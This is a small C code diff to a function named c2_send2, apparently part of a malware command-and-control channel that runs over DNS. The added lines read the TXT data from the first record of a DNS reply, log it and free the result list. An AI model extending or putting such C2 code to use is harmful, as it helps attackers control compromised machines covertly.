@@ -486,7 +486,11 @@ int c2_send2(char* msg, int len) {
     }
 
     // TODO actually process result
+    DNS_RECORD record = result[0];
+    c2_log("Name: %s\nData: %s\n", record.pName, record.Data.TXT.pStringArray[0]);
     c2_log("[+] DNS query success");
+
+    DnsRecordListFree(result, DnsFreeRecordList);
     return 1;
 
 }
